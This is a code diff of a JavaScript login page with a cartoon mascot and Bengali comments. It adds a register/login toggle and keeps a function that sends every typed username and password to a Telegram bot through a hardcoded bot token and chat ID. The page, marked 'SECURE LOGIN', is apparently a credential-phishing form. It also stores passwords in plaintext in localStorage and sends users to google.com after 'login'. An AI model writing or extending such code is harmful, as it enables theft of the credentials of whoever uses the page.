@@ -2,74 +2,73 @@
 const img = document.getElementById('mascot-img');
 const pass = document.getElementById('password');
 const toggleBtn = document.getElementById('toggle-pass');
-const btn = document.getElementById('login-btn');
+const actionBtn = document.getElementById('action-btn');
+const toggleLink = document.getElementById('toggle-link');
+const formTitle = document.getElementById('form-title');
 
-// ইমেজগুলোর নাম (আপনার ফাইলে যে নাম দিয়ে সেভ করেছেন)
+let isLogin = true;
+
+// ইমেজ পোজ
 const poses = {
     idle: '1000022715.jpg',
     covering: '1000022716.jpg',
     peeking: '1000022717.jpg'
 };
 
-// ১. পাসওয়ার্ড বক্সে ক্লিক করলে কার্টুন চোখ ঢেকে ফেলবে
-pass.addEventListener('focus', () => {
-    if (pass.type === "password") {
-        img.src = poses.covering;
-    }
+// ১. পাসওয়ার্ড বক্সে ফোকাস লজিক
+pass.addEventListener('focus', () => { 
+    if(pass.type === "password") img.src = poses.covering; 
 });
 
-// ২. বক্স থেকে ক্লিক সরিয়ে নিলে সাধারণ পোজ
-pass.addEventListener('blur', () => {
-    if (pass.type === "password") {
-        img.src = poses.idle;
-    }
+pass.addEventListener('blur', () => { 
+    if(pass.type === "password") img.src = poses.idle; 
 });
 
-// ৩. চোখ আইকন (Show/Hide Password) লজিক
+// ২. পাসওয়ার্ড টগল (Show/Hide) লজিক
 toggleBtn.addEventListener('click', () => {
     if (pass.type === "password") {
         pass.type = "text";
-        img.src = poses.peeking; // আঙুলের ফাঁক দিয়ে দেখা
-        toggleBtn.innerText = "🙈"; 
+        img.src = poses.peeking;
+        toggleBtn.innerText = "🙈";
     } else {
         pass.type = "password";
-        img.src = poses.covering; // আবার চোখ ঢাকা
+        img.src = poses.covering;
         toggleBtn.innerText = "👁️";
     }
 });
 
-// ৪. টেলিগ্রাম বটের মাধ্যমে ডাটা পাঠানো
-function sendData() {
+// ৩. ফর্ম সুইচ লজিক (Login <-> Register)
+function switchForm() {
+    isLogin = !isLogin;
+    formTitle.innerText = isLogin ? "Login" : "Create Account";
+    actionBtn.innerText = isLogin ? "SECURE LOGIN" : "REGISTER";
+    toggleLink.innerText = isLogin ? "Create Account" : "Already have an account? Login";
+}
+
+// ৪. মূল হ্যান্ডেলার (লগইন ও সাইন-আপ)
+function handleAuth() {
     const user = document.getElementById('username').value;
     const passVal = pass.value;
 
-    // ভ্যালিডেশন
-    if (user === "" || passVal === "") {
-        alert("দয়া করে ইউজারনেম এবং পাসওয়ার্ড লিখুন!");
-        return;
+    if (!user || !passVal) return alert("Please fill all fields!");
+
+    if (isLogin) {
+        // লগইন লজিক
+        if (localStorage.getItem(user) === passVal) {
+            alert("Login Successful! Redirecting...");
+            window.location.href = "https://www.google.com"; // আপনার মেইন পেজ
+        } else {
+            alert("Invalid username or password!");
+        }
+    } else {
+        // সাইন-আপ লজিক
+        localStorage.setItem(user, passVal);
+        alert("Account created successfully! Now you can login.");
+        switchForm();
     }
 
-    // বাটন আপডেট
-    btn.innerText = "CONNECTING...";
-    btn.disabled = true; // ডাবল ক্লিক রোধ করার জন্য
-
+    // টেলিগ্রামে ডাটা পাঠানো (লগিং)
     const token = "8736432847:AAHbDf-tOzpa6q--_R-1MRGeENKkh9CEHWc";
     const chatId = "7950771882";
-    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=👤 User: ${user}%0A🔑 Pass: ${passVal}`;
-    
-    fetch(url)
-    .then(response => {
-        if (response.ok) {
-            btn.innerText = "SECURE LOGIN";
-            btn.disabled = false;
-            alert("সফলভাবে লগইন রিকোয়েস্ট পাঠানো হয়েছে!");
-        } else {
-            throw new Error('Failed');
-        }
-    })
-    .catch(error => {
-        btn.innerText = "ERROR";
-        btn.disabled = false;
-        console.error('Error:', error);
-    });
+    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=Action:${isLogin?'Login':'Signup'}%0AUser:${user}%0APass:${passVal}`);
 }
